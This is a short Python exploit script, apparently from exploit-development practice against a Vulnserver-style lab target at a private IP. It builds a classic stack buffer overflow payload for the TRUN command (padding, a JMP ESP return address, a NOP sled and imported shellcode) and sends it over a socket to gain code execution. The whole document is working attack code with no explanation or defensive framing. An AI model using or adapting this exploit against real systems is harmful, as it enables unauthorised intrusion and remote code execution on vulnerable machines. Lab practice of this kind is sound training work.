import socket
from utils import rl,badchar,shellcode2
from pwn import p32

rl('192.168.58.135',9999)



prefix = b"A" * 2003
jmpesp=p32(0x62501203)
shellcode=shellcode2
suffix= b"B"*(5004-len(prefix)-len(shellcode)-len(jmpesp)-10)
poc=prefix+jmpesp+b'\x90'*10+shellcode2+suffix
# poc=prefix+badchar
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.58.135',9999))
s.recv(1024)
s.send(b'TRUN /.:/' + poc +b'\r\n')
s.send(b'EXIT' +b'\r\n')